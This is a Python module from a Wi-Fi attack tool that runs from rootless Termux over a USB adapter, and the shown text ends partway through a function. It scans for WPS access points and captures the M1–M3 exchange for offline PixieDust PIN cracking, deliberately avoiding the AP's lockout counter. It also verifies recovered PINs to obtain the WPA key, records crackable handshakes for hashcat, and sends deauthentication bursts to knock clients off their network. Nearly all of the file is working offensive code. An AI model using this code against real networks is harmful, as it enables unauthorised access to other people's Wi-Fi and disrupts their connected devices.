"""Live PixieDust over a USB Wi-Fi adapter, from rootless Termux.

The WPS exchange stops at **M3**: the AP sends ``E-Hash1``/``E-Hash2``, we
derive the ``AuthKey`` locally and return everything PixieDust needs.  We never
send M4, so the AP never sees a wrong PIN and its WPS lockout counter does not
move.  (``verify_pin`` is the one optional exception: it checks a *recovered*
PIN with a single real attempt.)

The radio work itself is delegated to wifit3's Python driver layer; see
``thirdparty``.  Everything here is async because the drivers are.
"""

from __future__ import annotations

import asyncio
import json
import os
import time
from dataclasses import dataclass, field
from pathlib import Path

from . import termux_usb, thirdparty, util

SCAN_SECONDS = 25.0
CAPTURE_SECONDS = 30.0
VERIFY_SECONDS = 25.0


# ------------------------------------------------------------------- records


@dataclass
class AccessPoint:
    bssid: str
    ssid: str = ""
    channel: int = 0
    rssi: int = 0
    locked: bool = False
    version: str | None = None
    encryption: str = "OPEN"
    vendor: str = ""
    model: str = ""
    wps: bool = True
    clients: int = 0          # unique client MACs seen in data frames during the scan

    @property
    def wsc_2_0(self) -> bool:
        return (self.version or "").strip() == "2.0"

    def to_dict(self) -> dict:
        return {
            "bssid": self.bssid,
            "ssid": self.ssid,
            "channel": self.channel,
            "rssi": self.rssi,
            "wps": self.wps,
            "wps_locked": self.locked,
            "wps_version": self.version,
            "encryption": self.encryption,
            "vendor": self.vendor,
            "model": self.model,
            "clients": self.clients,
        }


@dataclass
class Capture:
    ap: AccessPoint
    pke: str = ""
    pkr: str = ""
    e_nonce: str = ""
    e_hash1: str = ""
    e_hash2: str = ""
    authkey: str = ""
    enrollee_mac: str = ""
    notes: list = field(default_factory=list)

    def values(self) -> dict:
        """The six values the offline engines consume (hex, no separators)."""
        return {
            "pke": self.pke,
            "pkr": self.pkr,
            "e_nonce": self.e_nonce,
            "e_hash1": self.e_hash1,
            "e_hash2": self.e_hash2,
            "authkey": self.authkey,
            "bssid": util.clean_hex(self.ap.bssid),
            "enrollee_mac": self.enrollee_mac,
        }

    def to_dict(self) -> dict:
        return {
            "access_point": self.ap.to_dict(),
            "capture": {
                "pke": self.pke,
                "pkr": self.pkr,
                "e_nonce": self.e_nonce,
                "e_hash1": self.e_hash1,
                "e_hash2": self.e_hash2,
                "authkey": self.authkey,
                "enrollee_mac": self.enrollee_mac,
            },
            "notes": self.notes,
        }


@dataclass
class VerifyResult:
    attempted: bool = False
    ok: bool = False
    pin: str = ""
    psk: str | None = None
    ssid: str | None = None
    detail: str = ""
    config_error: int | None = None
    pin_ok: bool = False
    status_code: str = ""
    config_error_name: str = ""
    flow: str = "same_session"
    reached_m1: bool = False
    identity_reqs: int = 0
    eapol_resends: int = 0
    ack_failures: int = 0
    stage: str = "assoc"
    had_encrypted_settings: bool = False
    decrypt_ok: bool | None = None
    m4_sent: bool = False
    assoc_count: int = 0

    def to_dict(self) -> dict:
        return {
            "attempted": self.attempted,
            "ok": self.ok,
            "pin_ok": self.pin_ok,
            "pin": self.pin,
            "psk": self.psk,
            "ssid": self.ssid,
            "detail": self.detail,
            "status_code": self.status_code,
            "config_error": self.config_error,
            "config_error_name": self.config_error_name,
            "flow": self.flow,
            "reached_m1": self.reached_m1,
            "identity_reqs": self.identity_reqs,
            "eapol_resends": self.eapol_resends,
            "ack_failures": self.ack_failures,
            "stage": self.stage,
            "had_encrypted_settings": self.had_encrypted_settings,
            "decrypt_ok": self.decrypt_ok,
            "m4_sent": self.m4_sent,
            "assoc_count": self.assoc_count,
        }


@dataclass
class AutoAttackResult:
    capture: Capture | None = None
    crack: dict = field(default_factory=dict)
    verify: VerifyResult = field(default_factory=VerifyResult)
    pin_recovered: bool = False
    status_code: str = ""
    detail: str = ""
    flow: str = "none"
    assoc_count: int = 0


@dataclass
class HandshakeCapture:
    """One captured WPA 4-way handshake (monitor RX, optional bounded deauth).

    ``complete`` (and ``valid``) is True only when wifit3's own crackability
    check (``Handshake.find_valid_pair``) found a pair hashcat can crack.  A
    pcap is written **only** in that case, so a stopped capture can never leave
    an empty or unusable handshake file behind.
    """

    ap: AccessPoint
    path: str = ""
    frames: int = 0
    eapol_frames: int = 0
    messages: list = field(default_factory=list)
    complete: bool = False
    valid_pairs: int = 0
    client_mac: str = ""
    pair: str = ""
    clients: int = 0
    elapsed_s: float = 0.0
    deauth_sent: int = 0
    deauth_acked: int = 0
    deauth_bursts: int = 0
    notes: list = field(default_factory=list)

    @property
    def valid(self) -> bool:
        return self.complete

    def to_dict(self) -> dict:
        return {
            "path": self.path,
            "frames": self.frames,
            "eapol_frames": self.eapol_frames,
            "messages": list(self.messages),
            "complete": self.complete,
            "valid": self.valid,
            "valid_pairs": self.valid_pairs,
            "client_mac": self.client_mac,
            "pair": self.pair,
            "clients": self.clients,
            "elapsed_s": self.elapsed_s,
            "deauth_sent": self.deauth_sent,
            "deauth_acked": self.deauth_acked,
            "deauth_bursts": self.deauth_bursts,
            "notes": self.notes,
        }


def _safe_name(value: str, fallback: str = "network") -> str:
    """Filename-safe rendering of an SSID (no path separators, no spaces)."""
    cleaned = "".join(c if (c.isalnum() or c in "-_") else "_" for c in (value or ""))
    cleaned = cleaned.strip("_")[:40]
    return cleaned or fallback


# ------------------------------------------------------------------- imports


def prepare(ui=None) -> None:
    """Check pyusb, install the Termux fd shim, locate wifit3."""
    try:
        import usb.core  # noqa: F401
    except ImportError as exc:  # pragma: no cover - environment dependent
        raise util.PixieError("pyusb is missing - run: pip install pyusb") from exc
    if termux_usb.inherited_fd() is not None:
        termux_usb.install_shim()
    thirdparty.ensure_importable()


# ------------------------------------------------------------------- session


class Session:
    """One open adapter. Keep it alive for scan + capture + verify."""

    def __init__(self, iface):
        self.iface = iface
        self.last_scan_stats: dict = {}

    # -- info -------------------------------------------------------------

    @property
    def description(self) -> str:
        iface = self.iface
        return (getattr(iface, "product_name", None)
                or getattr(iface, "description", None)
                or getattr(iface, "chipset", None)
                or getattr(iface, "name", "adapter"))

    # -- scan -------------------------------------------------------------

    async def scan(self, timeout: float = SCAN_SECONDS, ui=None,
                   include_all: bool = False, cancel_event=None) -> list:
        """Hop channels and collect beacons/probe responses.

        With ``include_all`` every access point is returned (``ap.wps`` says
        whether WPS is advertised); otherwise only WPS ones are kept.
        """
        from wifit3.dot11.packet import BeaconPacket
        try:
            from wifit3.wlan.channels import scan_hop_order
        except Exception:
            scan_hop_order = None

        found: dict = {}
        clients: dict = {}
        stats = {
            "raw_packets": 0,
            "beacon_count": 0,
            "callback_errors": 0,
            "rx_bursts": 0,
            "channels": [],
            "elapsed_s": 0.0,
            "unique_aps": 0,
            "clients_seen": 0,
            "cancelled": False,
        }

        def emit_clients() -> None:
            """Airodump-style live client table: MAC + RSSI, every ~0.5 s."""
            if ui is None or not hasattr(ui, "clients"):
                return
            now = time.time()
            rows = []
            for ap_bssid, macs in clients.items():
                for mac, info in macs.items():
                    if now - info["last"] > 180.0:
                        continue
                    rows.append({
                        "bssid": ap_bssid,
                        "mac": mac,
                        "rssi": info["rssi"],
                        "age": round(max(0.0, now - info["last"]), 1),
                    })
            try:
                ui.clients({"clients": rows})
            except Exception:
                pass

        def on_packet(pkt):
            stats["raw_packets"] += 1
            try:
                if isinstance(pkt, BeaconPacket):
                    stats["beacon_count"] += 1
                    fallback_ch = getattr(self.iface, "current_channel", 0) or 0
                    _record_beacon(found, pkt, include_all, fallback_channel=fallback_ch)
                    return
                # Monitor RX sees every management/data frame on the channel: a
                # unicast client MAC is direct evidence that the station is
                # associated with that BSSID. Keep its latest signal too.
                if getattr(pkt, "type_id", None) in (0, 2):
                    mac = getattr(pkt, "client_mac", None)
                    bssid = (getattr(pkt, "bssid", "") or "").lower()
                    if mac and bssid:
                        info = clients.setdefault(bssid, {}).setdefault(
                            mac.lower(), {"rssi": -100, "last": time.time()})
                        rssi = getattr(pkt, "rssi", None)
                        if rssi is not None:
                            info["rssi"] = int(rssi)
                        info["last"] = time.time()
            except Exception as exc:
                stats["callback_errors"] += 1
                if ui and stats["callback_errors"] <= 5:
                    ui.warn(f"Beacon callback error: {exc}")

        raw_channels = list(getattr(self.iface, "supported_channels", None) or [1, 6, 11])
        channels = scan_hop_order(raw_channels) if scan_hop_order else raw_channels
        stats["channels"] = list(channels)

        reader = getattr(getattr(self.iface, "driver", None), "_reader", None)
        bursts_before = int(getattr(reader, "_bufs_consumed", 0) or 0) if reader else 0
        scan_start = time.monotonic()

        self.iface.register_rx_callback(on_packet)
        if ui:
            ui.info(f"scanning {len(channels)} channel(s) ({channels[:6]}...) for {timeout:.1f}s ...")
        try:
            deadline = scan_start + max(0.1, float(timeout))
            per_channel_dwell = min(0.35, max(0.05, float(timeout) / max(len(channels), 1) * 0.8))
            next_snapshot = scan_start + 0.5
            while time.monotonic() < deadline:
                if cancel_event is not None and cancel_event.is_set():
                    stats["cancelled"] = True
                    break
                if getattr(self.iface, "_device_lost", False):
                    raise util.PixieError("USB adapter disconnected during scan (detached)")
                for channel in channels:
                    remaining = deadline - time.monotonic()
                    if remaining <= 0:
                        break
                    if cancel_event is not None and cancel_event.is_set():
                        stats["cancelled"] = True
                        break
                    if getattr(self.iface, "_device_lost", False):
                        raise util.PixieError("USB adapter disconnected during scan (detached)")
                    await self.iface.set_channel(channel, scan=True)
                    await asyncio.sleep(min(per_channel_dwell, max(0.02, remaining)))
                    if time.monotonic() >= next_snapshot:
                        emit_clients()
                        next_snapshot = time.monotonic() + 0.5
        finally:
            self.iface.unregister_rx_callback(on_packet)
            emit_clients()
            bursts_after = int(getattr(reader, "_bufs_consumed", 0) or 0) if reader else 0
            stats["rx_bursts"] = max(0, bursts_after - bursts_before)
            stats["elapsed_s"] = round(time.monotonic() - scan_start, 3)
            stats["unique_aps"] = len(found)
            self.last_scan_stats = stats
            if ui:
                ui.info(
                    f"scan finished in {stats['elapsed_s']}s: "
                    f"bursts={stats['rx_bursts']}, packets={stats['raw_packets']}, "
                    f"beacons={stats['beacon_count']}, aps={stats['unique_aps']}, "
                    f"cb_errors={stats['callback_errors']}"
                )

        # Attach the per-BSSID client tally after the RX callback is gone, so the
        # count is stable and no caller observes a half-filled set.
        for bssid, ap in found.items():
            ap.clients = len(clients.get(bssid, ()))
        stats["clients_seen"] = sum(len(macs) for macs in clients.values())
        if ui:
            busy = sum(1 for ap in found.values() if ap.clients > 0)
            ui.info(f"monitor RX: {stats['clients_seen']} client(s) across {busy} network(s)")

        return sorted(found.values(), key=lambda ap: (-ap.rssi, ap.bssid))

    # -- capture M1..M3 ---------------------------------------------------

    async def capture(self, ap: AccessPoint, timeout: float = CAPTURE_SECONDS,
                      ui=None) -> Capture:
        """Associate and capture the WPS M1 -> M3 exchange (no M4)."""
        return await _capture_m3(self.iface, ap, timeout, ui)

    # -- WPA 4-way handshake capture (monitor RX + optional bounded deauth) --

    async def capture_handshake(self, ap: AccessPoint, timeout: float = 120.0,
                                folder: str = "", ui=None, cancel_event=None,
                                deauth: bool = False, deauth_rounds: int = 3,
                                max_clients: int = 3, max_bursts: int = 4,
                                initial_listen: float = 5.0,
                                settle: float = 4.0) -> HandshakeCapture:
        """Record one crackable WPA 4-way handshake of *ap* while monitoring.

        The radio listens continuously on the AP's channel.  Every EAPOL-Key
        frame of every client is fed into wifit3's own ``Handshake`` model, and
        wifit3's crackability check (``crackable_pairs`` / ``find_valid_pair``)
        decides whether a real handshake was captured.  A libpcap file
        (linktype 105, readable by ``hcxpcapngtool`` / ``hashcat -m 22000``) is
        written **only** when that check succeeds: stopping the capture can
        never leave an empty or unusable file in the folder.

        With ``deauth=True`` the capture follows wifit3's own deauth campaign
        (``wifit3.campaigns.deauth``): it learns the associated clients from the
        monitored frames and, only while no valid handshake has landed, sends
        the same bounded two-way ``iface.deauth_client(..., rounds=N)`` burst
        that wifit3 uses, or one broadcast burst when no client MAC was learned.
        The burst count is capped by ``max_bursts`` and every transmitted frame
        is counted and reported, so this can never turn into a deauth flood.
        """
        from wifit3.crack.handshake import crackable_pairs
        from wifit3.dot11.packet import BeaconPacket, EapolPacket
        from wifit3.models.handshake import Handshake, HandshakeMessage
        from wifit3.persist.pcap import write_pcap

        MAX_RECORDS = 20000
        SNAPSHOT_EVERY = 0.5
        # How long a silent station stays listed. A deauth/disassoc removes it
        # at once; this timeout covers a client that simply went away.
        CLIENT_TTL = 45.0
        bssid = (ap.bssid or "").lower()
        records: list = []
        messages: set = set()
        clients: dict = {}
        handshakes: dict = {}
        notes: list = []
        frames = 0
        eapol_frames = 0
        deauth_sent = 0
        deauth_acked = 0
        bursts = 0
        beacon_raw = None
        akm_offered: list = []
        vendor_akm = False
        rsn_seen = False
        started = time.monotonic()
        end_reason = "timeout"

        def _hs_for(client_mac: str) -> Handshake:
            hs = handshakes.get(client_mac)
            if hs is None:
                hs = Handshake(bssid=bssid, client_mac=client_mac)
                handshakes[client_mac] = hs
            if beacon_raw:
                hs.beacon_frame = beacon_raw
                hs.akm_offered = list(akm_offered)
                hs.vendor_akm_offered = vendor_akm
                hs.rsn_ie_seen = rsn_seen
            return hs

        def _track_client(mac, rssi) -> None:
            if not mac:
                return
            mac = mac.lower()
            info = clients.get(mac)
            if info is None:
                clients[mac] = {"rssi": int(rssi if rssi is not None else -100),
                                "last": time.time()}
                if ui:
                    ui.info(
                        f"client {mac} on {bssid} · signal "
                        f"{int(rssi if rssi is not None else -100)} dBm"
                    )
                # A new station must show up immediately, not on the next tick.
                _emit_clients()
            else:
                if rssi is not None:
                    info["rssi"] = int(rssi)
                info["last"] = time.time()

        def _emit_clients() -> None:
            """Publish the live client table (MAC + RSSI) to the UI, every ~0.5 s."""
            if ui is None or not hasattr(ui, "clients"):
                return
            now = time.time()
            # A station that has been silent longer than CLIENT_TTL is gone
            # (disconnected, out of range, or deauthenticated): drop it so the
            # table follows joins *and* leaves.
            for mac in [m for m, d in clients.items() if now - d["last"] > CLIENT_TTL]:
                clients.pop(mac, None)
                if ui:
                    ui.info(f"client {mac} left {bssid}")
            rows = [
                {"bssid": bssid, "mac": mac, "rssi": data["rssi"],
                 "age": round(max(0.0, now - data["last"]), 1)}
                for mac, data in sorted(clients.items(), key=lambda kv: -kv[1]["rssi"])
            ]
            try:
                ui.clients({"bssid": bssid, "clients": rows})
            except Exception:
                pass

        def _mark_gone(mac: str) -> None:
            """A deauth/disassoc for this station removes it from the table."""
            if not mac:
                return
            mac = mac.lower()
            info = clients.get(mac)
            if info is None:
                return
            info["last"] = time.time() - (CLIENT_TTL - 2.0)
            _emit_clients()

        def on_packet(pkt):
            nonlocal frames, eapol_frames, beacon_raw, akm_offered, vendor_akm, rsn_seen
            try:
                frame_bssid = (getattr(pkt, "bssid", "") or "").lower()
                source = (getattr(pkt, "source", "") or "").lower()
                dest = (getattr(pkt, "dest", "") or "").lower()
                if bssid not in (frame_bssid, source, dest):
                    return
                # A deauth/disassoc is direct evidence that the station left;
                # remove it now instead of waiting for the inactivity timeout.
                if (getattr(pkt, "type_id", None) == 0
                        and getattr(pkt, "subtype_id", None) in (10, 12)):
                    leaver = dest if dest and dest != bssid else source
                    if leaver and leaver != bssid:
                        _mark_gone(leaver)
                raw = getattr(pkt, "raw", None)
                if raw and len(records) < MAX_RECORDS:
                    records.append((bytes(raw), time.time()))
                    frames += 1

                if isinstance(pkt, BeaconPacket):
                    if raw:
                        beacon_raw = bytes(raw)
                    akm_offered = list(getattr(pkt, "akm_suites", []) or [])
                    vendor_akm = bool(getattr(pkt, "vendor_akm_offered", False))
                    rsn_seen = bool(getattr(pkt, "rsn_ie_raw", None))
                    # Back-fill handshakes created before this beacon.
                    for hs in handshakes.values():
                        hs.beacon_frame = beacon_raw
                        hs.akm_offered = list(akm_offered)
                        hs.vendor_akm_offered = vendor_akm
                        hs.rsn_ie_seen = rsn_seen

                mac = getattr(pkt, "client_mac", None)
                if mac:
                    _track_client(mac, getattr(pkt, "rssi", None))

                if not (isinstance(pkt, EapolPacket) or getattr(pkt, "type", "") == "eapol"):
                    return
                eapol_frames += 1
                number = int(getattr(pkt, "msg_num", 0) or 0)
                replay = getattr(pkt, "replay_counter", None)
                if not (mac and raw and replay):
                    return
                if 1 <= number <= 4:
                    messages.add(number)
                hs = _hs_for(mac.lower())
                if hs.has_message(bytes(raw)):
                    return
                hs.add_message(HandshakeMessage(
                    raw=bytes(raw),
                    msg_num=number,
                    replay_hex=bytes(replay).hex(),
                    nonce=getattr(pkt, "nonce", None) or b"",
                    mic=getattr(pkt, "mic", None) or b"",
                    key_data_len=int(getattr(pkt, "key_data_len", 0) or 0),
                    eapol_payload=getattr(pkt, "payload", b"") or b"",
                    timestamp=time.time(),
                    akm=getattr(pkt, "akm", None),
                    akm_selection_rejected=bool(
                        getattr(pkt, "akm_selection_rejected", False)),
                    mdid=getattr(pkt, "mdid", b"") or b"",
                    r0khid=getattr(pkt, "r0khid", b"") or b"",
                    r1khid=getattr(pkt, "r1khid", b"") or b"",
                ))
                if ui:
                    label = f"M{number}" if number else "EAPOL-?"
                    ui.info(
                        f"[{label}] {bssid} <-> {mac.lower()} "
                        f"(replay {bytes(replay).hex()})"
                    )
            except Exception as exc:  # one malformed frame must not kill the capture
                if ui:
                    ui.warn(f"handshake rx error: {exc}")

        if ui:
            ui.info(
                f"monitor capture on channel {ap.channel} for up to {timeout:.0f}s "
                f"(zero TX until the first deauth burst)"
            )
            if deauth:
                ui.info(
                    "deauth is armed: only the clients seen on this BSSID are "
                    f"targeted, {deauth_rounds} round(s) per client, max {max_bursts} burst(s)"
                )
            else:
                ui.info("passive mode: waiting for a client to rejoin on its own")

        await self.iface.set_channel(int(ap.channel), scan=True)
        self.iface.register_rx_callback(on_packet)
        next_snapshot = started
        next_wait_log = started + 5.0
        try:
            deadline = started + max(5.0, float(timeout))
            next_burst = started + max(1.0, float(initial_listen))
            while time.monotonic() < deadline:
                if cancel_event is not None and cancel_event.is_set():
                    notes.append("cancelled by the user")
                    end_reason = "cancelled"
                    break
                if getattr(self.iface, "_device_lost", False):
                    raise util.PixieError("USB adapter disconnected during capture (detached)")

                # wifit3's own crackability check: a beacon is required so the
                # saved pcap carries the SSID the cracker needs.
                valid_now = []
                if beacon_raw:
                    for mac, hs in handshakes.items():
                        if hs.find_valid_pair() is not None:
                            valid_now.append(mac)
                if valid_now:
                    end_reason = "valid handshake"
                    notes.append(
                        f"crackable handshake observed for {valid_now[0]}, stopping early")
                    break

                now = time.monotonic()
                if now >= next_snapshot:
                    _emit_clients()
                    next_snapshot = now + SNAPSHOT_EVERY

                if deauth and bursts < max_bursts and now >= next_burst:
                    targets = sorted(clients)[:max_clients]
                    bursts += 1
                    try:
                        if targets:
                            for mac in targets:
                                rssi = int(clients.get(mac, {}).get("rssi", -100))
                                if ui:
                                    ui.info(
                                        f"deauth client {mac} (signal {rssi} dBm), "
                                        f"{deauth_rounds} round(s)"
                                    )
                                result = await self.iface.deauth_client(
                                    bssid, mac, rounds=max(1, int(deauth_rounds)))
                                deauth_sent += int(result.total_sent)
                                deauth_acked += int(result.total_acked)
                                if ui:
                                    ui.info(
                                        f"  sent={result.total_sent} acked={result.total_acked} "
                                        f"(an un-acked frame cannot wake that client)"
                                    )
                        else:
                            if ui:
                                ui.info(
                                    f"deauth burst {bursts}/{max_bursts}: no client MAC learnt yet, "
                                    "one broadcast burst"
                                )
                            sent = await self.iface.deauth_broadcast(bssid, count=20)
                            deauth_sent += int(sent or 0)
                        notes.append(
                            f"deauth burst {bursts}: sent={deauth_sent} acked={deauth_acked}")
                    except Exception as exc:
                        notes.append(f"deauth burst {bursts} failed: {exc}")
                        if ui:
                            ui.warn(f"deauth failed: {exc}")
                    next_burst = time.monotonic() + max(1.0, float(settle))

                if now >= next_wait_log:
                    if ui:
                        ui.info(
                            f"waiting for handshake M1-M4 · {len(clients)} client(s) · "
                            f"eapol={eapol_frames}"
                        )
                    next_wait_log = now + 5.0
                await asyncio.sleep(0.4)
        finally:
            self.iface.unregister_rx_callback(on_packet)
            _emit_clients()

        # One last crackability pass over every client seen on this BSSID.
        valid_entries = []
        if beacon_raw:
            for mac, hs in handshakes.items():
                pairs = crackable_pairs(hs)
                if pairs:
                    valid_entries.append((mac, hs, pairs))
        complete = bool(valid_entries)
        valid_pairs = sum(len(pairs) for _mac, _hs, pairs in valid_entries)
        first_client = valid_entries[0][0] if valid_entries else ""
        pair_label = ""
        if valid_entries:
            pair = valid_entries[0][2][0]
            pair_label = "M{}+M{}".format(
                min(pair.anonce_frame.msg_num, pair.mic_frame.msg_num),
                max(pair.anonce_frame.msg_num, pair.mic_frame.msg_num),
            )

        # A pcap is written only for a real, crackable pair.  Nothing else is
        # ever left on disk, so "stop capture" cannot produce an invalid file.
        path = ""
        if complete and records:
            if not folder:
                notes.append("valid handshake found but no writable folder was given")
            else:
                try:
                    os.makedirs(folder, exist_ok=True)
                    stamp = time.strftime("%Y%m%d-%H%M%S")
                    name = "handshake_{ssid}_{mac}_{stamp}.pcap".format(
                        ssid=_safe_name(ap.ssid),
                        mac=bssid.replace(":", "") or "ap",
                        stamp=stamp,
                    )
                    path = os.path.join(folder, name)
                    written = write_pcap(Path(path), records)
                    if not os.path.isfile(path) or os.path.getsize(path) <= 24:
                        if os.path.isfile(path):
                            os.remove(path)
                        path = ""
                        notes.append("pcap writer produced no usable file; nothing was saved")
                    else:
                        notes.append(
                            f"{written} frame(s) written · valid pair {pair_label} "
                            f"({valid_pairs} pair(s), client {first_client})"
                        )
                except Exception as exc:
                    notes.append(f"pcap write failed: {exc}")
                    path = ""
                    if ui:
                        ui.error(f"could not write the capture: {exc}")
        elif not complete:
            if eapol_frames == 0:
                notes.append("no EAPOL frame for this BSSID during the window")
            else:
                notes.append(
                    f"{eapol_frames} EAPOL frame(s), messages={sorted(messages)}, "
                    "but no crackable pair (hashcat needs M1+M2, M2+M3 or M3+M4 with "
                    "a usable MIC, SNonce and complete EAPOL payload)"
                )

        elapsed = round(time.monotonic() - started, 3)
        if ui:
            ui.info(
                f"capture finished in {elapsed}s: frames={frames}, eapol={eapol_frames}, "
                f"messages={sorted(messages)}, clients={len(clients)}, "
                f"valid_pairs={valid_pairs}, deauth={deauth_sent}/{deauth_acked} acked, "
                f"reason={end_reason}"
            )
            if path:
                ui.ok(f"valid handshake ({pair_label}) saved to {path}")
            elif complete:
                ui.warn("a crackable handshake was found but no file could be written")
            elif end_reason == "cancelled":
                ui.warn("stopped before a crackable handshake: nothing was saved")
            else:
                ui.warn("no crackable handshake in this window: nothing was saved "
                        "(no empty file is left behind)")

        return HandshakeCapture(
            ap=ap,
            path=path,
            frames=frames,
            eapol_frames=eapol_frames,
            messages=sorted(messages),
            complete=complete,
            valid_pairs=valid_pairs,
            client_mac=first_client,
            pair=pair_label,
            clients=len(clients),
            elapsed_s=elapsed,
            notes=notes,
            deauth_sent=deauth_sent,
            deauth_acked=deauth_acked,
            deauth_bursts=bursts,
        )

    # -- optional PIN verification ---------------------------------------

    async def verify_pin(self, ap: AccessPoint, pin: str,
                         timeout: float = VERIFY_SECONDS, ui=None) -> VerifyResult:
        """One real WPS attempt, to prove a recovered PIN and read the PSK."""
        return await _verify_pin(self.iface, ap, pin, timeout, ui)

    async def auto_pin_to_psk(
        self,
        ap: AccessPoint,
        *,
        modes: list | None = None,
        deep: bool = False,
        engine: str = "native",
        auto_verify: bool = True,
        capture_timeout: float = CAPTURE_SECONDS,
        resolver_timeout: float = 9.0,
        verify_timeout: float = VERIFY_SECONDS,
        teardown_delay: float = 4.0,
        eapol_interval: float = 5.0,
        eapol_window: float = 22.0,
        backoff_delays: tuple[float, ...] = (10.0, 20.0),
        ui=None,
    ) -> AutoAttackResult:
        """Automatic Flow A (same-session M1..M3 -> crack -> M4..M7) with Flow B fallback."""
        return await _auto_pin_to_psk(
            self.iface,
            ap,
            modes=modes,
            deep=deep,
            engine=engine,
            auto_verify=auto_verify,
            capture_timeout=capture_timeout,
            resolver_timeout=resolver_timeout,
            verify_timeout=verify_timeout,
            teardown_delay=teardown_delay,
            eapol_interval=eapol_interval,
            eapol_window=eapol_window,
            backoff_delays=backoff_delays,
            ui=ui,
        )

    async def close(self) -> None:
        try:
            await self.iface.close()
        except Exception:  # pragma: no cover - best effort
            pass


async def open_session(ui=None, name: str = "wlan0") -> Session:
    """Find a supported adapter, bring it up and return a session."""
    prepare(ui)
    from wifit3.device import manager

    if ui and termux_usb.is_termux():
        ui.info("Termux OTG: rootless through termux-usb (do NOT run as root)")

    ifaces = manager.wlan_ifaces()
    if not ifaces:
        raise util.PixieError(
            "no supported USB Wi-Fi adapter found.\n"
            "  - plug the adapter in through an OTG cable and accept the Android dialog\n"
            "  - built-in phone/laptop Wi-Fi does not work; a supported USB chipset does\n"
            "    (AR9271, RT3070/5370/5372/5572, RTL8812AU/8814AU/8821AU/8811CU/8822BU,\n"
            "     RTL8188EUS/8188FTV/8192FU, MT7601U/7610U/7612U/7921AU/7925U)\n"
            "  - run 'pixie live usb' to see what termux-usb sees"
        )
    iface = ifaces[0]
    iface.name = name
    if len(ifaces) > 1 and ui:
        ui.warn(f"{len(ifaces)} adapters found; using the first ({iface.description})")

    if ui:
        ui.info(f"bringing up {iface.description or iface.name} ...")
    try:
        ok = await iface.connect()
    except util.PixieError:
        raise
    except Exception as exc:
        raise util.PixieError(_explain_bringup(exc)) from None
    if not ok:
        raise util.PixieError(
            f"{iface.description or iface.name}: the driver reported a bring-up failure.\n"
            "  unplug, wait a few seconds, replug and try again"
        )
    return Session(iface)


def _explain_bringup(exc: Exception) -> str:
    name = type(exc).__name__
    text = str(exc).strip() or name
    lowered = text.lower()
    if "permission" in lowered or "access" in lowered or "eacces" in lowered:
        if termux_usb.is_termux():
            return (
                f"the adapter could not be opened ({text}).\n"
                "  no root needed: run 'pixie live scan' again and accept the Android\n"
                "  USB permission dialog from termux-usb\n"
                "  (if the dialog never appears, install the Termux:API app from F-Droid)"
            )
        return (f"the adapter could not be opened ({text}).\n"
                "  on Linux: the USB device node needs permissions (udev rule), or run as root")
    if "not found" in lowered or "no such device" in lowered:
        return (f"the adapter disappeared during bring-up ({text}).\n"
                "  replug it - OTG cables are a common culprit")
    return f"USB bring-up failed: {text}"


# ------------------------------------------------------------------ internals


def _vendor_for(bssid: str) -> str:
    """OUI fallback for APs whose WSC information element has no manufacturer."""
    try:
        from wifit3.id.common import vendor_for_mac

        return vendor_for_mac(bssid) or ""
    except Exception:
        return ""


def _record_beacon(found: dict, pkt, include_all: bool = False, fallback_channel: int = 0) -> None:
    """Merge one beacon/probe response into ``found`` (keyed by BSSID).

    Kept free of wifit3 imports so it can be unit-tested with a tiny stand-in
    packet.  ``include_all`` keeps non-WPS access points as well.
    """
    wps = bool(getattr(pkt, "wps", False))
    if not wps and not include_all:
        return
    bssid = (getattr(pkt, "bssid", "") or "").lower()
    if not bssid:
        return
    rssi = getattr(pkt, "rssi", None)
    rssi = -100 if rssi is None else rssi
    raw_ssid = getattr(pkt, "ssid", None) or ""
    ssid = "" if raw_ssid == "<hidden>" else raw_ssid
    channel = int(getattr(pkt, "channel", 0) or fallback_channel or 0)
    encryption = getattr(pkt, "encryption", None) or "OPEN"
    wsc_vendor = (getattr(pkt, "wsc_manufacturer", None) or "").strip()
    wsc_model = (
        (getattr(pkt, "wsc_model_name", None) or "").strip()
        or (getattr(pkt, "wsc_model_number", None) or "").strip()
        or (getattr(pkt, "wsc_device_name", None) or "").strip()
    )
    vendor = wsc_vendor or _vendor_for(bssid)
    model = wsc_model

    current = found.get(bssid)
    if current is not None:
        current.rssi = max(current.rssi, rssi)
        if not current.ssid and ssid:
            current.ssid = ssid
        if not current.channel and channel:
            current.channel = channel
        if (not current.encryption or current.encryption == "OPEN") and encryption != "OPEN":
            current.encryption = encryption
        # WSC names are more specific than the OUI fallback, so a later beacon
        # always upgrades it; a blank reading never erases a known value.
        if wsc_vendor and current.vendor != wsc_vendor:
            current.vendor = wsc_vendor
        elif not current.vendor and vendor:
            current.vendor = vendor
        if model and current.model != model:
            current.model = model
        if wps and not current.wps:
            current.wps = True
            current.version = getattr(pkt, "wps_version", None)
            current.locked = bool(getattr(pkt, "wps_locked", False))
        return
    found[bssid] = AccessPoint(
        bssid=bssid,
        ssid=ssid,
        channel=channel,
        rssi=rssi,
        locked=bool(getattr(pkt, "wps_locked", False)),
        version=getattr(pkt, "wps_version", None),
        encryption=encryption,
        vendor=vendor,
        model=model,
        wps=wps,
    )


def _data_frame(M, bssid: bytes, our_mac: bytes, payload: bytes) -> bytes:
    return M.build_data_frame(bssid, our_mac, bssid, payload)


def _strip_authenticator(attrs: bytes) -> tuple:
    """Split ``(body_without_auth, authenticator)`` from a WSC TLV blob."""
    from wifit3.dot11.wsc import messages as M

    header = b"\x10\x05\x00\x08"  # ATTR_AUTHENTICATOR, len 8 (big-endian)
    index = attrs.rfind(header)
    if index < 0 or index + 12 > len(attrs):
        return attrs, b""
    return attrs[:index], attrs[index + 4:index + 12]


async def _capture_m3(iface, ap: AccessPoint, timeout: float, ui) -> Capture:
    from wifit3.campaigns.auth_assoc import (
        Association, WlanTransport, build_client_leaving,
    )
    from wifit3.dot11.mac import mac_to_str, random_client_mac, str_to_mac
    from wifit3.dot11.wsc import crypto as wc
    from wifit3.dot11.wsc import messages as M
    from wifit3.dot11.wsc.assoc_ie import WPS_REQ_REGISTRAR, wps_assoc_ie

    if not ap.bssid:
        raise util.PixieError("no BSSID: run 'pixie live scan' first")
    if not ap.channel:
        raise util.PixieError(f"{ap.bssid}: channel unknown - pass --channel")
    if not ap.ssid:
        raise util.PixieError(
            f"{ap.bssid}: hidden SSID, cannot associate - pass --ssid if you know it"
        )

    bssid = str_to_mac(ap.bssid)
    our_mac = random_client_mac()
    wsc_20 = ap.wsc_2_0
    capture = Capture(ap=ap)

    await iface.set_channel(ap.channel)
    await iface.enable_rx_acks()
